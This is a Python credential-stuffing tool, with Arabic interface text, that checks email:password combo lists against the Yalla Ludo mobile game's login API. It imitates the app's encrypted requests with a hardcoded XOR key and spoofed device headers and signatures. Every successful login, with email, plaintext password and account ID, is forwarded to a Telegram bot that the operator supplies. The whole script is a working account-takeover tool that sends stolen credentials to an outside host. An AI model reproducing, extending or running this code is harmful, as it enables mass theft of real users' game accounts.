import base64
import json
import hashlib
import requests
import time
import os
import sys
from typing import List, Tuple

# ==================== التبعيات الاختيارية ====================
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA = True
except ImportError:
    COLORAMA = False
    class Dummy:
        pass
    Fore = Back = Style = Dummy()
    Fore.GREEN = Fore.RED = Fore.YELLOW = Fore.CYAN = Fore.MAGENTA = ''
    Back.GREEN = Back.RED = Back.YELLOW = ''
    Style.BRIGHT = ''

FIGLET = False
try:
    import pyfiglet
    FIGLET = True
except ImportError:
    pass

# ==================== الثوابت ====================
XOR_KEY = bytes.fromhex("6230346534663137366230663463313562343062626462383437623930353766")
URL = "https://httpgateway.lampjkl.com/api/LudoAccountLoginRpcApiProxy/EMailAccountLogin"
HEADERS = {
    'User-Agent': "YallaLudo-1.4.9.2-(Build 1040922)-Android 33",
    'Accept-Encoding': "gzip",
    'traceparent': "00-d7efd49d37f50362aeb3e7e0a0737059-bef01ce4bef8cd27-00",
    'baggage': "service.name=ludo",
    'userid': "0",
    'x-app-id': "ludo",
    'x-baggage': "eyJ0aW1lU3BhbiI6IjE3ODYyMzg5MzQ3NjIiLCJ2ZXJzaW9uIjoiMS40LjkuMiIsImRldmljZUlkIjoiNjRjNWU4MzQtZGY3ZC00M2FiLTkwNjQtZjIxMzYyOWU4N2U1IiwiZGV2aWNlTmFtZSI6InJlYWxtZSBSTVgzMDg1IiwiZGV2aWNlVHlwZSI6MiwiZG93bmxvYWRDaGFubmVsSWQiOjEsInNodU1lbmdJZCI6IkRVWm8ybzJvZDltbWtBb1VCZnNFbEdYNGZEb2lXNlhudDNnZCIsIm5vbmNlIjoiMTk3MTUxNTA1X2IzYmQ4ZGZiLWExMmMtNGY1ZC1iNjAxLTA0YjkxY2YzMjUzNSIsInBsYXRlVHlwZSI6MCwiTGFuZ3VhZ2VJZCI6MiwicGhvbmVNb2RlbCI6IlJNWDMwODUiLCJYLVBob25lLUNvdW50cnkiOiJJUSIsIlgtU2ltLUNvdW50cnkiOiJJUSIsIkFuZHJvaWRJZCI6ImZmNmM4MzE4MzNjODM1NThhNGU3ZWFjMTcyMDdiZDU5X2UzOGRiNzllYjExZjczNTIiLCJhcHBUeXBlIjowfQ==",
    'x-access-token': "",
    'x-timestamp': "1786238934764",
    'versionstring': "1.4.9.2",
    'x-sign': "2.0_2_592f987b54b740542e5b64f20adab59704c74f278577267b0dab4c715f641318",
    'x-hera': "0904a97e8845424b978828fea548a22e",
    'x-medusa': "LH0xDQnBijiGhBHp+tvV6CGKLkGPK6kouHYuFBleWGRvN4kjD+jcWYMFMOYKrs1aCiJ+EJqPpIv/ktEQ9D88zc1LDD2/naWZP2dA6pi+4g8=",
    'x-time': "1786238934770",
    'content-type': "application/json; charset=utf-8"
}

PAYLOAD_TEMPLATE = {
    "email": "",
    "password": "",
    "languageId": 2,
    "hostConfig": [
        {"bizType": 5000, "countryCode": "IQ", "hostUrl": "https://api-shumeng.moonlmn.com", "type": 2, "version": 4},
        {"bizType": 5001, "countryCode": "", "hostUrl": "ws://firebreak.yalla.games", "type": 1, "version": 1},
        {"bizType": 5002, "countryCode": "", "hostUrl": "", "type": 1, "version": 0},
        {"bizType": 5003, "countryCode": "", "hostUrl": "", "type": 1, "version": 0},
        {"bizType": 5004, "countryCode": "IQ", "hostUrl": "https://httpgateway.lampjkl.com", "type": 2, "version": 18},
        {"bizType": 5005, "countryCode": "IQ", "hostUrl": "https://broadcast.lampjkl.com", "type": 2, "version": 17},
        {"bizType": 5006, "countryCode": "IQ", "hostUrl": "https://broadcast-host.ylconfig.com", "type": 1, "version": 0},
        {"bizType": 5007, "countryCode": "IQ", "hostUrl": "https://file.carrstuv.com", "type": 2, "version": 27},
        {"bizType": 2001, "countryCode": "", "hostUrl": "https://roomapi.yalla.games,https://roomapi.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2002, "countryCode": "", "hostUrl": "https://roomclog.yalla.games,https://roomclog.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2003, "countryCode": "", "hostUrl": "https://roomlog.yalla.games,https://roomlog.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2004, "countryCode": "", "hostUrl": "https://roomconfig.yalla.games,https://roomconfig.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2005, "countryCode": "", "hostUrl": "https://roomab.yalla.games,https://roomab.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2006, "countryCode": "", "hostUrl": "https://roompay.yalla.games,https://roompay.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2007, "countryCode": "", "hostUrl": "https://roomactivity.yalla.games,https://roomactivity.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2008, "countryCode": "", "hostUrl": "https://roommail.yalla.games,https://roommail.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 1000, "countryCode": "IQ", "hostUrl": "https://account.lampjkl.com", "type": 2, "version": 19},
        {"bizType": 1001, "countryCode": "IQ", "hostUrl": "https://pay.lampjkl.com", "type": 2, "version": 17},
        {"bizType": 1002, "countryCode": "IQ", "hostUrl": "https://mail.lampjkl.com", "type": 2, "version": 18},
        {"bizType": 1003, "countryCode": "IQ", "hostUrl": "https://clog.lampjkl.com", "type": 2, "version": 17},
        {"bizType": 1004, "countryCode": "IQ", "hostUrl": "https://activity.lampjkl.com", "type": 2, "version": 18},
        {"bizType": 1005, "countryCode": "IQ", "hostUrl": "https://ab.lampjkl.com", "type": 2, "version": 17},
        {"bizType": 1006, "countryCode": "IQ", "hostUrl": "https://config.lampjkl.com", "type": 2, "version": 18},
        {"bizType": 1007, "countryCode": "IQ", "hostUrl": "https://game.lampjkl.com", "type": 2, "version": 17},
        {"bizType": 1008, "countryCode": "IQ", "hostUrl": "https://gameapi.lampjkl.com", "type": 2, "version": 18},
        {"bizType": 6000, "countryCode": "IQ", "hostUrl": "https://broadcast.lampjkl.com", "type": 1, "version": 0},
        {"bizType": 1009, "countryCode": "IQ", "hostUrl": "https://file.carrstuv.com", "type": 2, "version": 27},
        {"bizType": 3001, "countryCode": "IQ", "hostUrl": "https://social.lampjkl.com", "type": 2, "version": 18},
        {"bizType": 3002, "countryCode": "IQ", "hostUrl": "https://socialapi.lampjkl.com", "type": 2, "version": 17},
        {"bizType": 3003, "countryCode": "IQ", "hostUrl": "https://socialconfig.lampjkl.com", "type": 2, "version": 18},
        {"bizType": 3004, "countryCode": "IQ", "hostUrl": "https://socialpay.lampjkl.com", "type": 2, "version": 17}
    ],
    "timeSpan": "1786238934762",
    "version": "1.4.9.2",
    "deviceId": "64c5e834-df7d-43ab-9064-f213629e87e5",
    "deviceName": "realme RMX3085",
    "deviceType": 2,
    "downloadChannelId": 1,
    "shuMengId": "DUZo2o2od9mmkAoUBfsElGX4fDoiW6Xnt3gd",
    "nonce": "197151505_b3bd8dfb-a12c-4f5d-b601-04b91cf32535",
    "plateType": 0,
    "phoneModel": "RMX3085",
    "X-Phone-Country": "IQ",
    "X-Sim-Country": "IQ",
    "AndroidId": "ff6c831833c83558a4e7eac17207bd59_e38db79eb11f7352",
    "IsSubpackages": 0,
    "appType": 0
}

# ==================== دوال التشفير ====================
def xor_encrypt(data: bytes) -> bytes:
    return bytes([data[i] ^ XOR_KEY[i % len(XOR_KEY)] for i in range(len(data))])

def xor_decrypt(data: bytes) -> bytes:
    return bytes([data[i] ^ XOR_KEY[i % len(XOR_KEY)] for i in range(len(data))])

def build_payload(payload_dict: dict) -> dict:
    json_bytes = json.dumps(payload_dict, separators=(',', ':')).encode('utf-8')
    encrypted = xor_encrypt(json_bytes)
    return {"paramJsonString": base64.b64encode(encrypted).decode('utf-8')}

# ==================== فحص تسجيل الدخول (مع استخراج showNumId) ====================
def check_login(email: str, password_plain: str) -> Tuple[str, str, str]:
    """
    يعيد (الحالة, الرسالة, showNumId)
    الحالة: "success" / "wrong" / "error"
    """
    password_hash = hashlib.md5(password_plain.encode()).hexdigest().upper()
    payload = PAYLOAD_TEMPLATE.copy()
    payload["email"] = email
    payload["password"] = password_hash
    encrypted = build_payload(payload)

    try:
        resp = requests.post(URL, json=encrypted, headers=HEADERS, timeout=15)
        if resp.status_code != 200:
            return "error", f"HTTP {resp.status_code}", ""
        data = resp.json()
        status = data.get("status", -1)
        if status == 0:
            # استخراج showNumId بنفس طريقة الكود الثاني
            inner = data.get("data", {})
            show_num_id = inner.get("showNumId", inner.get("id", ""))
            return "success", "", str(show_num_id) if show_num_id else ""
        else:
            return "wrong", data.get("tips", "Unknown error"), ""
    except Exception as e:
        return "error", str(e), ""

# ==================== إرسال إلى تيليجرام (بصيغة جديدة) ====================
def send_telegram(token: str, chat_id: str, email: str, password: str, show_num_id: str):
    """يرسل رسالة بالشكل المطلوب مع showNumId"""
    if not show_num_id:
        show_num_id = "غير معروف"
    text = f"""✦ YALLA LUDO | @DD36DD ✦
────────────────
• 𝐈𝐃 ➔ {show_num_id}
────────────────
• 𝐄𝐌𝐀𝐈𝐋 ➔ {email}
• 𝐏𝐀𝐒𝐒 ➔ {password}
────────────────"""
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text
    }
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

# ==================== الشاشة الرئيسية ====================
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_title():
    if FIGLET:
        try:
            custom_fig = pyfiglet.Figlet(font='big')
            title = custom_fig.renderText('SAYBR')
        except:
            title = (
                "   _____   ___   __  __ ____   ____  \n"
                "  / ____| / _ \\  \\ \\/ /|  _ \\ |  _ \\ \n"
                " | (___  | | | |  \\  / | |_) || |_) |\n"
                "  \\___ \\ | | | |  /  \\ |  _ < |  _ < \n"
                "  ____) || |_| | / /\\ \\| |_) || |_) |\n"
                " |_____/  \\___/ /_/  \\_\\____/ |____/ \n"
            )
    else:
        title = (
            "   _____   ___   __  __ ____   ____  \n"
            "  / ____| / _ \\  \\ \\/ /|  _ \\ |  _ \\ \n"
            " | (___  | | | |  \\  / | |_) || |_) |\n"
            "  \\___ \\ | | | |  /  \\ |  _ < |  _ < \n"
            "  ____) || |_| | / /\\ \\| |_) || |_) |\n"
            " |_____/  \\___/ /_/  \\_\\____/ |____/ \n"
        )

    if COLORAMA:
        print(Fore.CYAN + Style.BRIGHT + title)
    else:
        print(title)
    print("=" * 60)

def print_dashboard(results: List[str], total: int):
    clear_screen()
    print_title()

    color_map = {
        "success": Back.GREEN + "  " if COLORAMA else "[]",
        "wrong":   Back.RED + "  " if COLORAMA else "[]",
        "error":   Back.YELLOW + "  " if COLORAMA else "[]"
    }
    reset = Style.RESET_ALL if COLORAMA else ""

    blocks_per_line = 50
    for i, res in enumerate(results):
        block = color_map.get(res, "? ")
        sys.stdout.write(block + reset)
        if (i + 1) % blocks_per_line == 0:
            sys.stdout.write("\n")
    sys.stdout.write("\n")
    sys.stdout.write(f"تم الفحص: {len(results)} / {total}\n")
    sys.stdout.flush()

# ==================== البرنامج الرئيسي ====================
def main():
    clear_screen()
    print_title()
    print("أداة فحص حسابات Yalla Ludo - SAYBR")
    print("=" * 40)

    file_path = input("أدخل اسم ملف الكومبو (email:password): ").strip()
    if not os.path.exists(file_path):
        print("الملف غير موجود!")
        return

    with open(file_path, 'r', encoding='utf-8') as f:
        raw_lines = [line.strip() for line in f if line.strip()]
    combos = []
    for line in raw_lines:
        if ':' in line:
            email, password = line.split(':', 1)
            combos.append((email.strip(), password.strip()))
    if not combos:
        print("لم يتم العثور على أي كومبو صالح في الملف.")
        return
    print(f"تم تحميل {len(combos)} كومبو.")

    token = input("أدخل توكن بوت تيليجرام: ").strip()
    chat_id = input("أدخل شات آيدي تيليجرام: ").strip()
    if not token or not chat_id:
        print("تحذير: لم يتم إدخال بيانات التيليجرام، لن يتم إرسال النتائج.")

    results = []
    total = len(combos)

    clear_screen()
    print_title()
    print("جاري الفحص ...")

    try:
        for idx, (email, password) in enumerate(combos, 1):
            status, msg, show_num_id = check_login(email, password)
            results.append(status)

            print_dashboard(results, total)

            if status == "success" and token and chat_id:
                send_telegram(token, chat_id, email, password, show_num_id)

            time.sleep(1)
    except KeyboardInterrupt:
        print("\nتم إيقاف الفحص من قبل المستخدم.")
        return

    print("\nالفحص اكتمل!")
    print(f"✅ ناجح: {results.count('success')}")
    print(f"❌ كلمة سر خاطئة: {results.count('wrong')}")
    print(f"⚠️ أخطاء: {results.count('error')}")

if __name__ == "__main__":
    main()
